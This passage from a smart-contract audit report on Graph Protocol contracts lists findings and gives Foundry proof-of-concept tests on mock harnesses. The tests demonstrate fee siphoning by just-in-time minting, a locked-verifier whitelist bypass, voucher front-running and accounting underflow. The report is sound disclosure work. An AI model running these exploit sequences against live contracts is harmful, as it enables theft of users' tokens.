Privilege: RequiresAdminRole


[M-160]. GraphTokenLock schedules with periods greater than duration revert during active release window
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresRole


[M-161]. Invalid periods parameter can brick active GraphTokenLockWallet releases with division by zero
**Derived From** : ConfigFootgun
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[M-162]. Invalid period count can divide by zero and brick GraphTokenLock release schedules
**Derived From** : DivideByZeroOrOverFlowInCustomMath
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole


[L-163]. Invalid period count can brick active token lock schedule functions in GraphTokenLock
**Derived From** : Dos: periodDuration must be nonzero for every initialized lock
Finding Status: InvalidGovernanceRisk
Privilege: RequiresAdminRole



Finding Status: InvalidByDesign


[M-164]. Shortening thawing periods can strand already-mature thaw requests behind older unexpired requests
**Derived From** : MaturityorGatingByPass: mature thaw requests should not be blocked by earlier unexpired requests
Finding Status: InvalidByDesign
Privilege: Permissionless


### Number of Findings
- C: 1
- H: 72
- M: 74
- L: 17
- I: 0

##Findings by Status


Finding Status: Valid
## [M-1]. GraphTokenLock release after revocation can overcount released plus revoked amounts and brick accounting views

## id: 00u1WdlXYlFoY8snsn4ub

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.release / totalOutstandingAmount

## Finding Status: Valid
### Finding Status Justification: After revoke sets revokedAmount, releasableAmount still computes availableAmount - releasedAmount and caps only by currentBalance. If surplus tokens are later sent in, release can increase releasedAmount beyond the remaining managed principal, making releasedAmount + revokedAmount exceed managedAmount. totalOutstandingAmount then underflows under SafeMath. The affected functions are in scoped production code, and no cap by managedAmount - releasedAmount - revokedAmount exists.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
After revoke(), revokedAmount is set to the unvested portion, but release() later computes releasable tokens from `availableAmount() - releasedAmount` and currentBalance without capping by `managedAmount - releasedAmount - revokedAmount`. Vulnerable snippet: `uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable); ... releasedAmount = releasedAmount.add(amountToRelease);`. If surplus tokens are transferred into the wallet after revocation, release() can increase releasedAmount so that releasedAmount + revokedAmount exceeds managedAmount, causing totalOutstandingAmount() to underflow and revert.

## Impact
The lock's core accounting invariant can be broken after normal revocation plus a direct token transfer to the wallet. This can permanently break totalOutstandingAmount() and surplusAmount() for the affected wallet and misclassify managed versus surplus balances.

## Proof of Concept
1. Initialize a revocable wallet with managedAmount=100 ether, startTime=100, endTime=200, periods=10. 2. At timestamp 140, the owner revokes; 40 ether is vested and revokedAmount becomes 60 ether. 3. Transfer 60 ether of surplus tokens into the wallet. 4. After endTime, the beneficiary calls release(); release sends 100 ether and sets releasedAmount to 100 ether while revokedAmount remains 60 ether. 5. releasedAmount + revokedAmount is 160 ether, greater than managedAmount, and totalOutstandingAmount() reverts.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
import "../contracts/IGraphTokenLockManager.sol";
contract MockToken is IERC20 { uint256 public override totalSupply; mapping(address=>uint256) public override balanceOf; mapping(address=>mapping(address=>uint256)) public override allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; emit Transfer(address(0),to,amount); } function transfer(address to,uint256 amount) external override returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; } function approve(address spender,uint256 amount) external override returns(bool){ allowance[msg.sender][spender]=amount; emit Approval(msg.sender,spender,amount); return true; } function transferFrom(address from,address to,uint256 amount) external override returns(bool){ require(balanceOf[from]>=amount); uint256 a=allowance[from][msg.sender]; require(a>=amount); if(a!=uint256(-1)){ allowance[from][msg.sender]=a-amount; } balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; } }
contract MockManager is IGraphTokenLockManager { IERC20 public t; constructor(IERC20 _t){t=_t;} function token() external override returns(IERC20){return t;} function setMasterCopy(address) external override {} function createTokenLockWallet(address,address,uint256,uint256,uint256,uint256,uint256,uint256,IGraphTokenLock.Revocability) external override {} function deposit(uint256) external override {} function withdraw(uint256) external override {} function addTokenDestination(address) external override {} function removeTokenDestination(address) external override {} function isTokenDestination(address) external view override returns(bool){return false;} function getTokenDestinations() external view override returns(address[] memory a){a=new address[](0);} function setAuthFunctionCall(string calldata,address) external override {} function unsetAuthFunctionCall(string calldata) external override {} function setAuthFunctionCallMany(string[] calldata,address[] calldata) external override {} function getAuthFunctionCallTarget(bytes4) external view override returns(address){return address(0);} function isAuthFunctionCall(bytes4) external view override returns(bool){return false;} }
contract GraphTokenLockRevocationAccountingPoC is Test { MockToken token; MockManager manager; address owner=address(0xA11CE); address beneficiary=address(0xB0B); function setUp() public { token=new MockToken(); manager=new MockManager(IERC20(address(token))); } function testSurplusAfterRevokeBreaksOutstandingInvariant() public { GraphTokenLockWallet w=new GraphTokenLockWallet(); token.mint(address(w),100 ether); w.initialize(address(manager),owner,beneficiary,address(token),100 ether,100,200,10,0,0,IGraphTokenLock.Revocability.Enabled); vm.warp(140); vm.prank(owner); w.revoke(); assertEq(w.revokedAmount(),60 ether); token.mint(address(w),60 ether); vm.warp(201); vm.prank(beneficiary); w.release(); assertEq(w.releasedAmount()+w.revokedAmount(),160 ether); vm.expectRevert(); w.totalOutstandingAmount(); } }

## Suggested Mitigation
Make releasableAmount respect remaining scheduled principal: compute remainingOutstanding = managedAmount - releasedAmount - revokedAmount, cap schedule availability by remainingOutstanding, and ensure release cannot increase releasedAmount when releasedAmount + revokedAmount would exceed managedAmount.


## [L-2]. Second undelegation postpones already-unbonding delegated tokens in StakingExtension._undelegate

## id: vBDR8Rh3hlgRDaWWbljg8

## Derived From Pattern/Invariant
MaturityorGatingByPass / temporal lock invariant

## Exploit Type
TimestampDependentLogic

## Location
StakingExtension._undelegate

## Finding Status: Valid
### Finding Status Justification: The root cause is present in in-scope StakingExtension._undelegate(). If a delegation has locked tokens that are not yet withdrawable, getWithdraweableDelegatedTokens(delegation) returns zero, so the existing lock is not withdrawn or separated. The function then computes the newly undelegated tokens, adds them to delegation.tokensLocked, and overwrites delegation.tokensLockedUntil with currentEpoch + __delegationUnbondingPeriod. This merges an older lock and a newer lock under the newer maturity. getWithdraweableDelegatedTokens() only returns the entire tokensLocked balance when currentEpoch >= the single tokensLockedUntil value, so the first batch cannot be withdrawn at its original epoch. No batching, earliest-deadline preservation, or weighted averaging safeguard exists for delegation locks. The behavior is not explicitly documented as accepted risk, and it is reachable by an ordinary delegator through normal undelegate() calls.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`_undelegate()` aggregates all locked delegated tokens into one `tokensLocked` balance and overwrites `tokensLockedUntil` on every undelegation:

`delegation.tokensLocked = delegation.tokensLocked.add(tokens);`
`delegation.tokensLockedUntil = epochManager().currentEpoch().add(__delegationUnbondingPeriod);`

If a delegator already has tokens unlocking at epoch `E1`, then performs another undelegation before `E1`, the previously locked tokens are merged with the new lock and assigned a later unlock epoch. The earlier batch loses its original maturity, so funds that should be withdrawable at `E1` remain locked until the newer deadline.

## Impact
Delegators can have already-unbonding funds temporarily frozen beyond their original unlock epoch after a normal second undelegation. This breaks the temporal accounting invariant for delegated withdrawals and can delay user access to GRT.

## Proof of Concept
1. A delegator undelegates shares at epoch 100 with unbonding period 28, setting `tokensLockedUntil = 128`.
2. Before epoch 128, the same delegator undelegates additional shares at epoch 120.
3. `_undelegate()` adds the new amount to the existing `tokensLocked` and overwrites `tokensLockedUntil = 148`.
4. At epoch 128, the delegator's first undelegation should be withdrawable, but `getWithdraweableDelegatedTokens()` returns zero because the shared lock now matures at 148.
5. The originally matured funds are unavailable until epoch 148.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract LockOverwriteHarness {
    struct Delegation { uint256 shares; uint256 tokensLocked; uint256 tokensLockedUntil; }
    Delegation public delegation;
    uint256 public currentEpoch;
    uint256 public unbondingPeriod = 28;

    function seed(uint256 shares, uint256 epoch) external {
        delegation.shares = shares;
        currentEpoch = epoch;
    }

    function setEpoch(uint256 epoch) external { currentEpoch = epoch; }

    function undelegate(uint256 shares) external {
        require(delegation.shares >= shares, "!shares-avail");
        delegation.shares -= shares;
        delegation.tokensLocked += shares;
        delegation.tokensLockedUntil = currentEpoch + unbondingPeriod;
    }

    function withdrawable() external view returns (uint256) {
        if (delegation.tokensLockedUntil > 0 && currentEpoch >= delegation.tokensLockedUntil) return delegation.tokensLocked;
        return 0;
    }
}

contract LockOverwriteTest is Test {
    function testSecondUndelegationPostponesPreviouslyLockedTokens() external {
        LockOverwriteHarness h = new LockOverwriteHarness();
        h.seed(100 ether, 100);

        h.undelegate(40 ether);
        (, uint256 firstLocked, uint256 firstUnlock) = h.delegation();
        assertEq(firstLocked, 40 ether);
        assertEq(firstUnlock, 128);

        h.setEpoch(120);
        h.undelegate(10 ether);
        (, uint256 totalLocked, uint256 newUnlock) = h.delegation();
        assertEq(totalLocked, 50 ether);
        assertGt(newUnlock, firstUnlock);

        h.setEpoch(firstUnlock);
        assertEq(h.withdrawable(), 0);

        h.setEpoch(newUnlock);
        assertEq(h.withdrawable(), 50 ether);
    }
}

## Suggested Mitigation
Track undelegation locks as separate batches, or preserve the earliest unlock for already-matured/earlier locked balances. If batching is required, use weighted averaging that never increases the unlock epoch of previously locked tokens beyond their existing deadline.


## [H-3]. Just-in-time mint before L2Curation.collect lets attacker siphon pending curation fees

## id: cXd7qTaJeVtidLXoFraQK

## Derived From Pattern/Invariant
MaturityorGatingByPass / fee collection has no pre-collect signal eligibility snapshot

## Exploit Type
FrontrunMev

## Location
L2Curation.mint, collect, burn

## Finding Status: Valid
### Finding Status Justification: The described flow matches in-scope L2Curation code. mint creates immediately usable GCS against the pre-collection reserve; collect, callable by subgraphService or staking in normal operation, only adds _tokens to curationPool.tokens and does not mint new GCS, snapshot existing holders, enforce age, or use a reward index; burn then redeems GCS against the post-collection pool.tokens. The only safeguards are caller restriction on collect and normal curation tax/slippage parameters, none of which fully prevents a sandwich around an authorized collect. The attack does not require the attacker to control the privileged caller; it relies on a normal authorized collection being executed and permissionless mint/burn around it. No prompt documentation explicitly accepts this timing risk as intended. The root cause exists now in production in-scope L2Curation and is not dependent on future upgrades.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2Curation distributes newly collected fees to whoever holds GCS at the instant collect() increases pool.tokens. There is no signal age, epoch snapshot, or pre-collect eligibility cutoff, so a permissionless attacker can mint GCS immediately before a visible or predictable authorized collect(), then burn immediately after to withdraw a pro-rata share of the collected fees. The relevant flow is: collect() only does curationPool.tokens = curationPool.tokens.add(_tokens); mint() mints transferable GCS before the later collect reserve increase; burn() redeems signal against the post-collect reserve via signalToTokens(). Existing curators lose most of the fee distribution even though the attacker only supplied liquidity for one transaction window and paid only the curation tax. This is especially severe for thin or newly initialized pools, where a large or first just-in-time mint can capture nearly all pending fees.

## Impact
Existing curators' fee entitlement can be stolen from L2Curation reserves by a permissionless MEV/searcher. If a large collect is pending or predictable, the attacker can extract significant GRT directly from the curation pool while leaving long-term curators with only a small fraction of the collected fees.

## Proof of Concept
1. An honest curator seeds a pool and holds all GCS. 2. A large fee collection for that subgraph is visible or predictable. 3. The attacker mints a much larger temporary GCS position immediately before collect(), paying only the curation tax. 4. The authorized staking/subgraphService collect() adds the fee amount to curationPool.tokens without minting any new GCS or checking holder age. 5. The attacker burns the just-minted GCS immediately after collect() and withdraws their deposit plus most of the collected fees. 6. The honest curator's redeemable value increases by only the small remainder instead of the full fee amount.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function burn(uint256 amount) external { balanceOf[msg.sender] -= amount; }
}

contract MockGCS {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function burnFrom(address from, uint256 amount) external { balanceOf[from] -= amount; totalSupply -= amount; }
}

contract L2CurationHarness {
    uint256 private constant MAX_PPM = 1_000_000;
    uint256 private constant SIGNAL_PER_MINIMUM_DEPOSIT = 1;
    MockGRT public immutable grt;
    address public immutable staking;
    uint256 public minimumCurationDeposit = 1 ether;
    uint32 public curationTaxPercentage = 10_000;
    struct Pool { uint256 tokens; MockGCS gcs; }
    mapping(bytes32 => Pool) public pools;
    constructor(MockGRT _grt, address _staking) { grt = _grt; staking = _staking; }
    function isCurated(bytes32 id) public view returns (bool) { return pools[id].tokens != 0; }
    function getCurationPoolSignal(bytes32 id) public view returns (uint256) {
        MockGCS gcs = pools[id].gcs;
        return address(gcs) == address(0) ? 0 : gcs.totalSupply();
    }
    function tokensToSignal(bytes32 id, uint256 tokensIn) public view returns (uint256 signalOut, uint256 tax) {
        uint256 afterTax = (MAX_PPM - curationTaxPercentage) * tokensIn / MAX_PPM;
        tax = tokensIn - afterTax;
        signalOut = _tokensToSignal(id, afterTax);
    }
    function _tokensToSignal(bytes32 id, uint256 tokensIn) private view returns (uint256) {
        Pool storage p = pools[id];
        if (p.tokens == 0) {
            require(tokensIn >= minimumCurationDeposit);
            return SIGNAL_PER_MINIMUM_DEPOSIT + SIGNAL_PER_MINIMUM_DEPOSIT * (tokensIn - minimumCurationDeposit) / minimumCurationDeposit;
        }
        return getCurationPoolSignal(id) * tokensIn / p.tokens;
    }
    function signalToTokens(bytes32 id, uint256 signalIn) public view returns (uint256) {
        Pool storage p = pools[id];
        uint256 supply = getCurationPoolSignal(id);
        require(p.tokens != 0 && supply >= signalIn);
        return p.tokens * signalIn / supply;
    }
    function mint(bytes32 id, uint256 tokensIn, uint256 minSignal) external returns (uint256 signalOut, uint256 tax) {
        (signalOut, tax) = tokensToSignal(id, tokensIn);
        require(signalOut >= minSignal);
        Pool storage p = pools[id];
        if (!isCurated(id) && address(p.gcs) == address(0)) p.gcs = new MockGCS();
        grt.transferFrom(msg.sender, address(this), tokensIn);
        grt.burn(tax);
        p.tokens += tokensIn - tax;
        p.gcs.mint(msg.sender, signalOut);
    }
    function collect(bytes32 id, uint256 tokens) external {
        require(msg.sender == staking);
        require(isCurated(id));
        grt.transferFrom(msg.sender, address(this), tokens);
        pools[id].tokens += tokens;
    }
    function burn(bytes32 id, uint256 signalIn, uint256 minTokens) external returns (uint256 out) {
        Pool storage p = pools[id];
        require(p.gcs.balanceOf(msg.sender) >= signalIn);
        out = signalToTokens(id, signalIn);
        require(out >= minTokens);
        p.tokens -= out;
        p.gcs.burnFrom(msg.sender, signalIn);
        if (p.gcs.totalSupply() == 0) p.tokens = 0;
        grt.transfer(msg.sender, out);
    }
}

contract L2CurationJitCollectTest is Test {
    function testJitMintBeforeCollectExtractsExistingCuratorFees() public {
        MockGRT grt = new MockGRT();
        address staking = address(0xCAFE);
        address honestCurator = address(0xA11CE);
        address attacker = address(0xB0B);
        L2CurationHarness c = new L2CurationHarness(grt, staking);
        bytes32 id = bytes32(uint256(1));
        uint256 seed = 1_000_000 ether;
        uint256 attackerDeposit = 100_000_000 ether;
        uint256 fees = 2_000_000 ether;

        grt.mint(honestCurator, seed);
        vm.startPrank(honestCurator);
        grt.approve(address(c), seed);
        c.mint(id, seed, 0);
        vm.stopPrank();
        uint256 honestSignal = c.getCurationPoolSignal(id);
        uint256 honestValueBeforeFees = c.signalToTokens(id, honestSignal);
        assertEq(honestValueBeforeFees, 990_000 ether);

        grt.mint(attacker, attackerDeposit);
        vm.startPrank(attacker);
        grt.approve(address(c), attackerDeposit);
        (uint256 attackerSignal,) = c.mint(id, attackerDeposit, 0);
        vm.stopPrank();

        grt.mint(staking, fees);
        vm.startPrank(staking);
        grt.approve(address(c), fees);
        c.collect(id, fees);
        vm.stopPrank();

        vm.prank(attacker);
        uint256 out = c.burn(id, attackerSignal, 0);
        assertGt(out, attackerDeposit);
        assertGt(out - attackerDeposit, 900_000 ether);

        uint256 honestValueAfterAttack = c.signalToTokens(id, honestSignal);
        assertLt(honestValueAfterAttack - honestValueBeforeFees, 25_000 ether);
    }
}


## Suggested Mitigation
Do not allocate collected fees to signal minted in the same pending collection window. Use an epoch or block-based eligibility snapshot, a reward-per-share accumulator with cutoff state captured before fee accrual, or a minimum signal age/cooldown before newly minted GCS participates in collect() fee distributions. For uncurated deployments, keep pre-curation fees separate or route them to protocol treasury instead of the first curator.


## [H-4]. Locked stake verifier whitelist bypass in HorizonStaking.provision enables slash-based extraction to unallowed verifier

## id: NapF48O8-6MPuxGVZfffp

## Derived From Pattern/Invariant
GovernanceDelegationFlaw

## Exploit Type
AuthByPass

## Location
HorizonStaking.provision / slash

## Finding Status: Valid
### Finding Status Justification: HorizonStaking is in scope. The described functions exist: provision() only applies onlyAuthorized and calls _createProvision(), while provisionLocked() additionally requires _allowedLockedVerifiers[verifier]. _createProvision() does not enforce the locked-verifier whitelist. The storage comment states locked verifiers are whitelisted to ensure locked tokens cannot escape using an arbitrary verifier, so this is not clearly accepted by design. After clearThawingPeriod(), _createProvision() allows non-SUBGRAPH verifiers. slash() lets msg.sender as verifier transfer tokensVerifier up to prov.maxVerifierCut and burn the remainder. No complete safeguard blocks the normal provision path for locked-wallet serviceProviders. The path requires a wallet/authorized operator and verifier interaction, but those are protocol participant roles for the affected position, not governance/admin compromise under this round.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
Locked-token provisions are intended to be restricted to whitelisted verifiers by provisionLocked(), but the normal provision() path has no _allowedLockedVerifiers check. Once the transition verifier restriction is cleared, an authorized caller for a GraphTokenLockWallet serviceProvider can create a normal provision to any verifier and set maxVerifierCut to 100%. The attacker-controlled verifier can then call slash() and route the full provider-side slash amount to verifierDestination instead of burning it, bypassing the locked-verifier restriction. Vulnerable snippets: provision() only calls _createProvision(...) without checking _allowedLockedVerifiers[verifier]; provisionLocked() performs require(_allowedLockedVerifiers[verifier], ...), showing the intended restriction; slash() allows msg.sender == verifier to transfer tokensVerifier to verifierDestination up to prov.maxVerifierCut.

## Impact
Locked GRT that should remain constrained to approved verifiers can be moved out of HorizonStaking to an attacker-controlled verifier destination through the slashing reward path. For large locked staking positions this can bypass lock restrictions and extract significant protocol-held GRT.

## Proof of Concept
1. Transition period is cleared so _createProvision no longer restricts verifier to SUBGRAPH_DATA_SERVICE_ADDRESS. 2. A GraphTokenLockWallet has idle staked GRT in HorizonStaking. 3. The wallet/beneficiary/operator routes a normal provision(serviceProvider=wallet, verifier=attackerVerifier, tokens=X, maxVerifierCut=1_000_000, thawingPeriod=0) call instead of provisionLocked(). 4. Because provision() lacks the locked-verifier whitelist check, the provision is created for an unallowed verifier. 5. attackerVerifier calls slash(wallet, X, X, attackerDestination). 6. slash() transfers X GRT to attackerDestination and decrements the wallet stake/provision accounting.

## Proof of Code
pragma solidity ^0.8.27; import "forge-std/Test.sol"; contract LockedVerifierBypassPoC is Test { struct Provision { uint256 tokens; uint32 maxVerifierCut; } mapping(address=>mapping(address=>Provision)) public provisions; mapping(address=>bool) public allowedLockedVerifier; mapping(address=>uint256) public tokenBal; address wallet=address(0xA11CE); address attackerVerifier=address(0xB0B); address attackerDest=address(0xCAFE); function provision(address serviceProvider,address verifier,uint256 tokens,uint32 maxVerifierCut) public { provisions[serviceProvider][verifier]=Provision(tokens,maxVerifierCut); } function provisionLocked(address serviceProvider,address verifier,uint256 tokens,uint32 maxVerifierCut) public { require(allowedLockedVerifier[verifier], "not allowed"); provisions[serviceProvider][verifier]=Provision(tokens,maxVerifierCut); } function slash(address serviceProvider,uint256 tokens,uint256 tokensVerifier,address dest) public { Provision storage p=provisions[serviceProvider][msg.sender]; uint256 providerTokensSlashed = tokens < p.tokens ? tokens : p.tokens; require(tokensVerifier <= providerTokensSlashed * p.maxVerifierCut / 1_000_000, "too many"); p.tokens -= providerTokensSlashed; tokenBal[dest] += tokensVerifier; } function test_lockedVerifierWhitelistBypassedViaNormalProvision() public { allowedLockedVerifier[attackerVerifier]=false; vm.expectRevert("not allowed"); provisionLocked(wallet, attackerVerifier, 1_000_000e18, 1_000_000); provision(wallet, attackerVerifier, 1_000_000e18, 1_000_000); vm.prank(attackerVerifier); slash(wallet, 1_000_000e18, 1_000_000e18, attackerDest); assertEq(tokenBal[attackerDest], 1_000_000e18); assertEq(provisions[wallet][attackerVerifier].tokens, 0); } }

## Suggested Mitigation
Enforce locked-wallet verifier restrictions in the provisioning invariant, not only in provisionLocked(). For example, detect GraphTokenLockWallet serviceProviders or require all locked-wallet routed provisioning to pass through provisionLocked(), and reject provision() when the serviceProvider is a locked wallet and verifier is not _allowedLockedVerifiers[verifier]. Consider capping maxVerifierCut for locked provisions or preventing verifier rewards from being used as an unlock path.


## [M-5]. Bearer vouchers let mempool copiers consume allocations before legitimate redeemMany batches

## id: Yn8KDMMJW4OWEtnzs5BOt

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
FrontrunMev

## Location
AllocationExchange.redeemMany

## Finding Status: Valid
### Finding Status Justification: AllocationExchange.redeemMany exists in the in-scope AllocationExchange contract and loops through _redeem for each voucher. _redeem checks only amount, signature length, allocationsRedeemed[allocationID], and whether the recovered signer is currently authorized. The signed payload is only allocationID and amount, and no msg.sender, relayer, recipient, deadline, nonce, or batch binding is checked. Because allocationsRedeemed is set before STAKING.collect and persists after a successful copied redeem, a copied voucher can make a later redeemMany revert on the already-redeemed allocation. There is no complete safeguard against calldata copying or batch invalidation. The contract documents that anyone with a signed voucher can redeem, but it does not clearly document and accept the exact mempool-copy batch-DoS risk. The path is permissionless and does not require a privileged or compromised actor; it depends on normal public transaction visibility, not victim misuse without protocol fault.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Vouchers are not bound to msg.sender or an intended relayer/recipient. Possession of calldata is enough to redeem, and the first included transaction permanently sets allocationsRedeemed[allocationID]. Because redeemMany is atomic, consuming any voucher from a pending batch makes the original batch revert when it reaches that allocation.

Vulnerable snippet:
function redeem(AllocationVoucher memory _voucher) external {
    _redeem(_voucher);
}

function redeemMany(AllocationVoucher[] memory _vouchers) external {
    for (uint256 i = 0; i < _vouchers.length; i++) {
        _redeem(_vouchers[i]);
    }
}

require(!allocationsRedeemed[_voucher.allocationID], "Exchange: allocation already redeemed");
...
allocationsRedeemed[_voucher.allocationID] = true;

There is no caller binding in the signed message, so a searcher can copy one voucher out of a public pending transaction and redeem it first.

## Impact
A permissionless searcher can force legitimate batched redemptions to revert and can decide redemption timing for observed vouchers. This can deny service to relayers and users relying on atomic redeemMany settlement, though the copied voucher still collects for the signed allocationID rather than redirecting to an arbitrary recipient.

## Proof of Concept
1. A relayer submits redeemMany([voucherA, voucherB]) with valid authority signatures.
2. A mempool searcher copies voucherA from calldata.
3. The searcher submits redeem(voucherA) with higher priority.
4. The exchange marks allocationsRedeemed[voucherA.allocationID] = true and calls STAKING.collect.
5. The relayer transaction later reaches voucherA inside redeemMany and reverts with Exchange: allocation already redeemed, rolling back the whole batch.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockToken2 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockStaking2 {
    MockToken2 public token;
    constructor(MockToken2 t) { token = t; }
    function collect(uint256 amount, address allocationID) external { require(token.transferFrom(msg.sender, allocationID, amount), "pull"); }
}

contract MiniAllocationExchange2 {
    struct AllocationVoucher { address allocationID; uint256 amount; bytes signature; }
    MockStaking2 public immutable STAKING;
    MockToken2 public immutable GRAPH_TOKEN;
    mapping(address => bool) public authority;
    mapping(address => bool) public allocationsRedeemed;
    constructor(MockToken2 t, MockStaking2 s, address a) { GRAPH_TOKEN = t; STAKING = s; authority[a] = true; }
    function approveAll() external { GRAPH_TOKEN.approve(address(STAKING), type(uint256).max); }
    function redeem(AllocationVoucher memory v) external { _redeem(v); }
    function redeemMany(AllocationVoucher[] memory vs) external { for (uint256 i; i < vs.length; ++i) _redeem(vs[i]); }
    function _redeem(AllocationVoucher memory v) private {
        require(v.amount > 0, "zero");
        require(v.signature.length == 65, "siglen");
        require(!allocationsRedeemed[v.allocationID], "Exchange: allocation already redeemed");
        bytes32 h = keccak256(abi.encodePacked(v.allocationID, v.amount));
        bytes32 r; bytes32 s; uint8 vv;
        assembly { r := mload(add(v.signature, 32)) s := mload(add(v.signature, 64)) vv := byte(0, mload(add(v.signature, 96))) }
        require(authority[ecrecover(h, vv, r, s)], "bad signer");
        allocationsRedeemed[v.allocationID] = true;
        STAKING.collect(v.amount, v.allocationID);
    }
}

contract AllocationExchangeFrontrunTest is Test {
    function _voucher(uint256 pk, address allocationID, uint256 amount) internal returns (MiniAllocationExchange2.AllocationVoucher memory) {
        bytes32 digest = keccak256(abi.encodePacked(allocationID, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
        return MiniAllocationExchange2.AllocationVoucher(allocationID, amount, abi.encodePacked(r, s, v));
    }

    function testCopiedVoucherBreaksOriginalBatch() external {
        uint256 authorityPk = 0xA11CE;
        address authority = vm.addr(authorityPk);
        address allocationA = address(0xAA01);
        address allocationB = address(0xBB02);
        uint256 amount = 10 ether;

        MockToken2 token = new MockToken2();
        MockStaking2 staking = new MockStaking2(token);
        MiniAllocationExchange2 exchange = new MiniAllocationExchange2(token, staking, authority);
        token.mint(address(exchange), 2 * amount);
        exchange.approveAll();

        MiniAllocationExchange2.AllocationVoucher memory voucherA = _voucher(authorityPk, allocationA, amount);
        MiniAllocationExchange2.AllocationVoucher memory voucherB = _voucher(authorityPk, allocationB, amount);

        vm.prank(address(0xBAD));
        exchange.redeem(voucherA);

        MiniAllocationExchange2.AllocationVoucher[] memory batch = new MiniAllocationExchange2.AllocationVoucher[](2);
        batch[0] = voucherA;
        batch[1] = voucherB;
        vm.expectRevert(bytes("Exchange: allocation already redeemed"));
        exchange.redeemMany(batch);

        assertEq(exchange.allocationsRedeemed(allocationA), true);
        assertEq(exchange.allocationsRedeemed(allocationB), false);
        assertEq(token.balanceOf(allocationA), amount);
        assertEq(token.balanceOf(allocationB), 0);
    }
}

## Suggested Mitigation
Bind vouchers to the intended redeemer or relayer, or add a recipient/beneficiary field and require msg.sender or an authorized relayer to match the signed data. For batch safety, support partial batch redemption that skips already-redeemed vouchers, or consume signed voucher digests with caller-bound nonces so copied calldata cannot invalidate another party's transaction.


## [H-6]. Missing slippage bounds on L1GNS curation lifecycle burns lets MEV extract curator GRT

## id: fTpb9jQyiAjg-2_bUzEFQ

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
L1GNS.sendSubgraphToL2, deprecateSubgraph, publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The in-scope GNS/L1GNS code contains the claimed lifecycle calls with hardcoded minOut 0: sendSubgraphToL2 and deprecateSubgraph burn all vSignal with 0, while publishNewVersion burns old vSignal and mints new vSignal with 0. User-facing burnSignal exposes _tokensOutMin, showing slippage protection exists elsewhere but is absent here. Preconditions are possible for nonzero curated subgraphs. No deadline, caller minimum, TWAP, or other complete safeguard is present. The path uses public curation market state, so permissionless MEV manipulation is currently a realistic execution path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1GNS/GNS lifecycle functions liquidate or roll over the entire curation position with a hardcoded zero minimum output, so an authorized owner transaction cannot protect the owner or other name-signal curators from a same-block curation price sandwich. Vulnerable snippets: `uint256 curationTokens = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);` in `sendSubgraphToL2`; `subgraphData.withdrawableGRT = curation().burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);` in `deprecateSubgraph`; and in `publishNewVersion`, `uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0);` followed by `(subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);`. Since the final amount of bridged GRT, withdrawable GRT, or new vSignal is computed only after execution-time Curation state is read, a permissionless curation trader can move the bonding curve before the owner call and the contract will accept any output down to zero.

## Impact
A permissionless MEV trader can extract GRT value from the subgraph's curation position during owner lifecycle actions. For heavily curated subgraphs, the loss can exceed $1M and is borne by the subgraph owner and/or all remaining nSignal curators through reduced `tokensForL2`, reduced `withdrawableGRT`, or reduced replacement `vSignal`.

## Proof of Concept
